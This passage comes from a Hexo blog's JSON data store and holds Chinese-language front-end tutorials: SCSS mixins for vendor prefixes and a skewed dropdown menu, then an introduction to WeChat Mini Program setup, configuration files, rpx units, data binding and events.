class=\"variable\">$degrees</span>) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(transform, skewX(<span class=\"variable\">$degrees</span>), webkit moz o ms spec);</span><br><span class=\"line\">  -webkit-<span class=\"attribute\">backface-visibility</span>: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"6\">\n<li>定义fit-content</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//6.定义transition</span></span><br><span class=\"line\"><span class=\"comment\">// Return vendor-prefixed property names if appropriate</span></span><br><span class=\"line\"><span class=\"comment\">// Example: transition-property-names((transform, color, background), moz) -&gt; -moz-transform, color, background//----------------------------------------</span></span><br><span class=\"line\">@function transition-property-names(<span class=\"variable\">$props</span>, <span class=\"variable\">$vendor</span>: false) &#123;</span><br><span class=\"line\">  <span class=\"variable\">$new-props</span>: ();</span><br><span class=\"line\">  @<span class=\"keyword\">each</span> <span class=\"variable\">$prop</span> in <span class=\"variable\">$props</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$new-props</span>: append(<span class=\"variable\">$new-props</span>, transition-property-name(<span class=\"variable\">$prop</span>, <span class=\"variable\">$vendor</span>), comma);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  @return <span class=\"variable\">$new-props</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@function transition-property-name(<span class=\"variable\">$prop</span>, <span class=\"variable\">$vendor</span>: false) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// put other properties that need to be prefixed here aswell</span></span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$vendor</span> and <span class=\"variable\">$prop</span> == transform &#123;</span><br><span class=\"line\">    @return unquote(<span class=\"string\">'-'</span>+<span class=\"variable\">$vendor</span>+<span class=\"string\">'-'</span>+<span class=\"variable\">$prop</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  @<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    @return <span class=\"variable\">$prop</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// transition</span></span><br><span class=\"line\"><span class=\"comment\">//----------------------------------------</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> transition (<span class=\"variable\">$properties</span>...) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">if</span> length(<span class=\"variable\">$properties</span>) &gt;= 1 &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> prefixer(transition, <span class=\"variable\">$properties</span>, webkit moz o ms spec);</span><br><span class=\"line\">  &#125; @<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$properties</span>: all <span class=\"number\">0.15s</span> ease-out <span class=\"number\">0</span>;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> prefixer(transition, <span class=\"variable\">$properties</span>, webkit moz o ms spec);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"7\">\n<li>定义fit-content</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//7.定义fit-content</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> fit-content &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: -webkit-fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: -moz-fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: -o-fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: -ms-fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: fit-content;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"8\">\n<li>定义box-shadow</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//8.设置box-shadow</span></span><br><span class=\"line\"><span class=\"comment\">// box-shadow</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> box-shadow(<span class=\"variable\">$shadow</span>...) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(box-shadow, <span class=\"variable\">$shadow</span>, webkit spec);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"9\">\n<li>定义文本</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//9.设置文本</span></span><br><span class=\"line\">%typography &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"variable\">$color</span>;</span><br><span class=\"line\">  text: &#123;</span><br><span class=\"line\">    decoration: none;</span><br><span class=\"line\">    align: center;</span><br><span class=\"line\">  &#125;   </span><br><span class=\"line\">  <span class=\"attribute\">font</span>: &#123;</span><br><span class=\"line\">    family: <span class=\"variable\">$fontFamily</span>;</span><br><span class=\"line\">    size: <span class=\"variable\">$fontSize</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"10\">\n<li>具体样式</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 10.具体样式</span></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"variable\">$width</span>;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %clearfix;<span class=\"comment\">//调用清除浮动</span></span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %listStyle;<span class=\"comment\">//调用清除列表样式</span></span><br><span class=\"line\">  @<span class=\"keyword\">include</span> fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">margin</span>: <span class=\"number\">50px</span> auto;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.drop-menu</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %listStyle;<span class=\"comment\">//调用清除列表样式</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"variable\">$bgColor</span>;</span><br><span class=\"line\">  <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">  <span class=\"attribute\">position</span>: relative;    @<span class=\"keyword\">include</span> skewX(<span class=\"number\">25deg</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %typography;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> <span class=\"selector-tag\">li</span>:hover &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"variable\">$sfbgColor</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span> &gt; <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">padding</span>: <span class=\"number\">1em</span> <span class=\"number\">2em</span>;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> skewX(-<span class=\"number\">25deg</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*Dropdown menu*/</span></span><br><span class=\"line\"><span class=\"selector-class\">.drop-menu</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"variable\">$width</span> / <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">  <span class=\"attribute\">margin-left</span>: -(<span class=\"variable\">$width</span> / <span class=\"number\">8</span>);</span><br><span class=\"line\">  <span class=\"attribute\">opacity</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"attribute\">visibility</span>: hidden;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> skewX(-<span class=\"number\">25deg</span>);</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> transform-origin(left top);</span><br><span class=\"line\">  <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"variable\">$bgColor</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">opacity</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">visibility</span>: hidden;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> transition(all .2s ease );</span><br><span class=\"line\">    <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">padding</span>: <span class=\"number\">1em</span> <span class=\"number\">2em</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;::after &#123;</span><br><span class=\"line\">      <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">      <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">      <span class=\"attribute\">top</span>: -<span class=\"number\">125%</span>;</span><br><span class=\"line\">      <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">      <span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">      @<span class=\"keyword\">include</span> box-shadow(<span class=\"number\">0</span> 0 50px rgba(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,.<span class=\"number\">9</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:nth-child(odd) &#123;</span><br><span class=\"line\">      @<span class=\"keyword\">include</span> transform(skewX(-<span class=\"number\">25deg</span>) translateX(<span class=\"number\">0</span>));</span><br><span class=\"line\">      <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> skewX(<span class=\"number\">25deg</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      &amp;::after &#123;</span><br><span class=\"line\">        <span class=\"attribute\">right</span>: -<span class=\"number\">50%</span>;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> transform(skewX(-<span class=\"number\">25deg</span>) rotate(<span class=\"number\">3deg</span>));</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:nth-child(even)&#123;</span><br><span class=\"line\">      @<span class=\"keyword\">include</span> transform(skewX(<span class=\"number\">25deg</span>) translateX(<span class=\"number\">0</span>));</span><br><span class=\"line\">      <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> skewX(-<span class=\"number\">25deg</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      &amp;::after &#123;</span><br><span class=\"line\">        <span class=\"attribute\">left</span>: -<span class=\"number\">50%</span>;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> transform(skewX(<span class=\"number\">25deg</span>) rotate(<span class=\"number\">3deg</span>));</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span>:hover <span class=\"selector-class\">.drop-menu</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span>:hover <span class=\"selector-class\">.drop-menu</span> <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">opacity</span>: <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"attribute\">visibility</span>: visible;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span>:hover <span class=\"selector-class\">.drop-menu</span> <span class=\"selector-tag\">li</span>:nth-child(even)&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> transform(skewX(<span class=\"number\">25deg</span>) translateX(<span class=\"number\">15px</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span>:hover <span class=\"selector-class\">.drop-menu</span> <span class=\"selector-tag\">li</span>:nth-child(odd)&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> transform(skewX(-<span class=\"number\">25deg</span>) translateX(-<span class=\"number\">15px</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"阅读\"><a href=\"#阅读\" class=\"headerlink\" title=\"阅读\"></a>阅读</h2><ul>\n<li><a href=\"https://www.sass.hk/\" target=\"_blank\" rel=\"noopener\">Sass中文网</a></li>\n<li><a href=\"https://www.w3cplus.com/preprocessor/sass-basic-syntax-and-features.html\" target=\"_blank\" rel=\"noopener\">SASS基础教程——SASS基本语法与特性</a></li>\n<li><a href=\"https://www.w3cplus.com/preprocessor/sass-basic-variable.html\" target=\"_blank\" rel=\"noopener\">sass揭秘之变量</a></li>\n<li><a href=\"https://www.w3cplus.com/preprocessor/sass-basic-mixins-nesting-placeholders-extend.html\" target=\"_blank\" rel=\"noopener\">理解SASS的嵌套，@extend，%Placeholders和Mixins</a></li>\n<li>在线编辑SCSS工具：<a href=\"https://www.sassmeister.com/\" target=\"_blank\" rel=\"noopener\">sassmeister</a></li>\n<li><a href=\"https://www.cnblogs.com/dingyufenglian/p/4864392.html\" target=\"_blank\" rel=\"noopener\">sass揭秘之@if，@for，@each（转载）</a></li>\n</ul>\n"},{"title":"WXMiniProgram","abbrlink":6316,"date":"2020-06-22T10:00:46.000Z","_content":"\n## 1.开发准备\n\n+  [账号申请](https://mp.weixin.qq.com/cgi-bin/registermidpage?action=index&lang=zh_CN)\n   + 选择注册账号类型 —— 小程序\n   + 账号信息\n   + 邮箱激活\n   + 信息登记\n\n+  绑定开发者\n   + [登录小程序](https://mp.weixin.qq.com/)\n   + 管理员授权\n   + 添加成员\n\n+  获取AppID\n   + 设置——开发设置\n\n+  开发工具\n   + 下载—扫码登录—选择小程序—创建小程序—预览模板界面\n\n+  [官方文档](https://developers.weixin.qq.com/miniprogram/dev/index.html?t=2018413)\n\n\n\n## 2.结构分析\n\n以下是小程序的基本目录结构，也可以根据需要任意添加其它目录，如资源目录 assets、第三方库vendors、扩展目录 extends等。\n\n```bash\n├── app.js ...................小程序入口文件\n├── app.json .................小程序全局配置\n├── app.wxss .................小程序全局样式\n├── pages ....................所有页面目录\n│   ├── index ................index页面目录\n│   │   ├── index.js .........index页面业务逻辑\n│   │   ├── index.wxml .......index页面布局结构\n│   │   └── index.wxss .......index页面布局样式\n│   └── logs .................logs页目录\n│       ├── logs.js ..........logs页面业务逻辑\n│       ├── logs.json ........logs页面配置文件\n│       ├── logs.wxml ........logs页面布局结构\n│       └── logs.wxss ........logs页面布局样式\n├── project.config.json ......开发工具配置文件\n└── utils ....................公共逻辑\n    └── util.js ..............实用工具\n```\n\n\n\n==主体 app：一个小程序主体部分由三个文件组成，放在项目的根目录（如果项目使用gulp或者webpack打包，则需要在`project.config.js` 指定 `\"miniprogramRoot\": \"路径“` 属性）==\n\n### 2.1全局配置\n\n通过 app.json 文件对小程序进行全局配置，如页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。\n\n**app.json 配置清单**\n\n| 属性           | 类型         | 必填 | 描述                 |\n| -------------- | ------------ | ---- | -------------------- |\n| pages          | String Array | 是   | 设置页面路径         |\n| window         | Object       | 否   | 设置默认窗口表现     |\n| tabBar         | Object       | 否   | 设置底部 tab 表现    |\n| networkTimeout | Object       | 否   | 设置网络超时时间     |\n| debug          | Boolean      | 否   | 设置是否开启调试模式 |\n\napp.json 示例\n\n```json\n{\n  \"pages\":[\n    \"pages/index/index\",\n    \"pages/detail/index\"\n  ]\n}\n```\n\n2. **window**\n\n对象类型，用于设置小程序的状态栏、导航条、标题、窗口背景色。\n\n| 属性                         | 类型     | 默认值  | 描述                               | 兼容 |\n| ---------------------------- | -------- | ------- | ---------------------------------- | ---- |\n| navigationBarBackgroundColor | HexColor | #000000 | 导航栏背景颜色，如\"#000000\"        | -    |\n| navigationBarTextStyle       | String   | white   | 导航栏标题颜色，仅支持 black/white |      |\n| navigationBarTitleText       | String   |         | 导航栏标题文字内容                 |      |\n| backgroundColor              | HexColor | #ffffff | 窗口的背景色                       |      |\n\n查看window[更多配置](https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#window)属性\n\n编辑 app.json，添加字段 windows\n\n```json\n{\n  \"window\": {\n     \"navigationBarBackgroundColor\": \"#262626\",\n     \"navigationBarTitleText\": \"XXX\",\n     \"navigationBarTextStyle\": \"white\",\n     \"backgroundColor\": \"#F0F0F0\"\n  }\n}\n```\n\n3. **tabBar**\n\n对象类型，配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。\n\n| 属性            | 类型     | 必填 | 默认值 | 描述                                    |\n| --------------- | -------- | ---- | ------ | --------------------------------------- |\n| color           | HexColor | 是   |        | tab 上的文字默认颜色                    |\n| selectedColor   | HexColor | 是   |        | tab 上的文字选中时的颜色                |\n| backgroundColor | HexColor | 是   |        | tab 的背景色                            |\n| borderStyle     | String   | 否   | black  | tabbar上边框的颜色， 仅支持 black/white |\n| list            | Array    | 是   |        | tab 的列表，最少2个、最多5个            |\n| position        | String   | 否   | bottom | 可选值 bottom、top                      |\n\n1. 当设置 position 为 top 时，将不会显示 icon\n2. tabBar 中的 list 是一个数组，**只能配置最少2个、最多5个 tab**，tab 按数组的顺序排序。\n\n其中 list 接受一个数组，数组中的每个项都是一个对象，其属性值如下：\n\n| 属性             | 类型   | 必填 | 描述                                                         |\n| ---------------- | ------ | ---- | ------------------------------------------------------------ |\n| pagePath         | String | 是   | 页面路径，必须在 pages 中先定义                              |\n| text             | String | 是   | tab 上按钮文字                                               |\n| iconPath         | String | 否   | 图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px，当 postion 为 top 时，此参数无效，不支持网络图片 |\n| selectedIconPath | String | 否   | 选中时的图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px ，当 postion 为 top 时，此参数无效 |\n\n### 2.2页面配置\n\n> 每个页面可以有不同的表现，通过 pages 目录下的 .json 文件，如 logs.json ，实现页面的局部配置。\n>\n> 但是只能设置 app.json 中的 window 配置项的内容，页面中配置项会覆盖 app.json 的 window 中相同的配置项。\n\n| 属性                         | 类型     | 默认值 | 描述                               |\n| ---------------------------- | -------- | ------ | ---------------------------------- |\n| navigationBarBackgroundColor | HexColor | #000   | 导航栏背景颜色                     |\n| navigationBarTextStyle       | String   | white  | 导航栏标题颜色，仅支持 black/white |\n| navigationBarTitleText       | String   |        | 导航栏标题文字内容                 |\n| backgroundColor              | HexColor | #fff   | 窗口的背景色                       |\n\n```\n// 在 pages/center 目录下创建 index.json\nFC/pages/center\n├── index.js\n├── index.json\n└── index.wxml\n```\n\n如下所示，编辑 index.json\n\n```json\n{\n  \"navigationBarBackgroundColor\": \"#ffffff\",\n  \"navigationBarTextStyle\": \"white\",\n  \"navigationBarTitleText\": \"我的\"\n}\n```\n\n### 2.3适配、样式和组件\n\n**一句话：开发小程序时所有屏幕宽度都是 750rpx。**\n\n**rpx（responsive pixel）可以根据屏幕宽度进行自适应。规定所有屏幕宽为750rpx。**\n\nrpx 与 px 的换算关系：\n\n| 设备           | 屏幕尺寸 | rpx换算px (屏幕宽度/750) | px换算rpx (750/屏幕宽度) |\n| -------------- | -------- | ------------------------ | ------------------------ |\n| iPhone5        | 320px    | 1rpx = 0.42px            | 1px = 2.34rpx            |\n| 小米MIX 2S     | 360px    | 1rpx = 0.48px            | 1px = 2.083rpx           |\n| iPhone6        | 375px    | 1rpx = 0.5px             | 1px = 2rpx               |\n| iPhone6 Plus   | 414px    | 1rpx = 0.552px           | 1px = 1.81rpx            |\n| HUAWEI Mate 10 | 480px    | 1rpx = 0.64px            | 1px = 1.562rpx           |\n\n- 样式导入\n\n  使用 @import 语句可以导入外联样式表， @import 后跟需要导入的外联样式表的相对路径，用 ; 表示语句结束。\n\n   ```css\n  /** common.wxss **/\n  page {\n  \tbackground: #F0F0F0;\n  }\n   ```\n\n  ```css\n  /** index.wxss **/\n  @import \"common.wxss\";\n  page {\n  \tbackground: #F2F2F2;\n  }\n  ```\n\n  \n\n- 内联样式\n\n- 外部样式\n\n**image 相当于 html 中的 img 标签，用来加载图片。**\n\n```html\n<!-- 通过 src 属性加载图片 -->\n<!-- 通过 mode 属性调整 图片的的显示方式 (裁切/缩放) -->\n<!-- image 组件默认宽度为300px，默认高度为225px -->\n<image src=\"../../static/uploads/item_1.png\" mode=\"aspectFit\"></image>\n```\n\n关于 [mode 有效值](https://developers.weixin.qq.com/miniprogram/dev/component/image.html)\n\n**text  相当于 html 中的 span，用来定义文本。**\n\n**view 相当于 html 中的 div，一般做为容器出现。**\n\n**swiper 滑块组件，可以用来实现类似轮播图布局效果。**\n\n## 3.基本语法\n\n####  数据绑定\n\n类似`vue`\n\n```js\n// pages/demo/data.js\nPage({\n    // 通过 data 属性，初始化页面中用到的数据\n    data: {\n        message: 'hello world!'\n        user: {\n            name: '小明',\n            age: 16\n        },\n        courses: ['wxml', 'wxss', 'javascript']\n    }\n});\n```\n\n\n\n```html\n<!-- pages/demo/data.wxml -->\n<text class=\"msg\">{{message}}</text>\n<text>\n  我叫{{user.name}}，\n  我今年{{user.age}}岁了，\n  我在学习{{courses[0]}}课程。\n</text>\n```\n\n#### 列表数据\n\n```js\n// pages/demo/data.js\nPage({\n    // 通过 data 属性，初始化页面中用到的数据\n    data: {\n        brands: [\n            {\n                name: '耐克',\n                origin: '美国',\n                category: ['男装', '女装', '鞋', '体育用品']\n            },\n            {\n                name: 'SK-II',\n                origin: '韩国',\n                category: ['防晒霜','面膜', '洗护']\n            }\n        ]\n    }\n});\n```\n\n\n\n```html\n<!-- pages/demo/data.wxml -->\n<view wx:for=\"{{brands}}\" wx:for-index=\"k\" wx:for-item=\"v\">\n    <view>\n        <text>{{k+1}} </text>\n        <text> {{v.name}} </text>\n        <text> {{v.origin}}</text>\n    </view>\n    <view>\n        <text wx:for=\"{{v.category}}\">{{item}}</text>\n    </view>\n</view>\n```\n\n\n\nwx:for 属性将当前组件按着数组的长度动态创建，并且通过 index 变量可以访问到数组的索引值，通过item变量可以访问到单元值。\n\n#### block\n\n```html\n<!-- pages/demo/data.wxml -->\n<block wx:for=\"{{users}}\">\n    <text>{{item.name}}</text>\n    <text>{{item.age}}</text>\n</block>\n```\n\n\n\n#### 条件数据\n\n```html\n<view wx:for=\"{{users}}\">\n    <text>{{index+1}} </text>\n    <text> {{item.name}}</text>\n    <text> {{item.age}} </text>\n    <text wx:if=\"{{item.age <= 14}}\"> 儿童</text>\n    <text wx:elif=\"{{item.age <= 18}}\"> 未成年</text>\n    <text wx:else> 成年人</text>\n</view>\n```\n\n\n\n```js\nPage({\n    data: {\n        users: [\n            {name: '小明', age: 18},\n            {name: '小红', age: 13},\n            {name: '小丽', age: 19}\n        ]\n    }\n});\n```\n\n#### 事件触发\n\n**语法格式： bind:事件名称=\"回调函数\"**\n\n```html\n<button type=\"primary\" bind:tap=\"sayHi\">点我试试</button>\n<input type=\"text\" bind:focus=\"sayHi\" bind:blur=\"sayBye\" />\n```\n\n\n\n```js\n// pages/demo/data.js\nPage({\n    sayHi: function () {\n        console.log('Hi~')\n    },\n    sayHi: function () {\n        console.log('Hi~');\n    },\n    sayBye: function (ev) { // ev  时间对象\n      \tconsole.log(ev);\n        console.log('Bye~');\n    }\n});\n```\n\n\n\n#### 事件冒泡\n\n+ 子元素用bindtap绑定事件后，执行的时候，会冒泡到父元素（触发父亲元素上绑定的bindtap事件）\n\n+ 如果不想冒泡到父元素，可以用catchtap代替\n\n```html\n<botton catchtap=\"goDetail\">catchtap</botton>\n<botton bindtap=\"goDetail\">bindtap</botton>\n```\n\n## 4.生命周期\n\n<img src=\"WXMiniProgram/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png\" alt=\"微信小程序的生命周期\" style=\"zoom:67%;\" />\n\n","source":"_posts/WXMiniProgram.md","raw":"---\ntitle: WXMiniProgram\ncategories:\n  - 微信\ntags:\n  - 微信小程序\nabbrlink: 6316\ndate: 2020-06-22 18:00:46\n---\n\n## 1.开发准备\n\n+  [账号申请](https://mp.weixin.qq.com/cgi-bin/registermidpage?action=index&lang=zh_CN)\n   + 选择注册账号类型 —— 小程序\n   + 账号信息\n   + 邮箱激活\n   + 信息登记\n\n+  绑定开发者\n   + [登录小程序](https://mp.weixin.qq.com/)\n   + 管理员授权\n   + 添加成员\n\n+  获取AppID\n   + 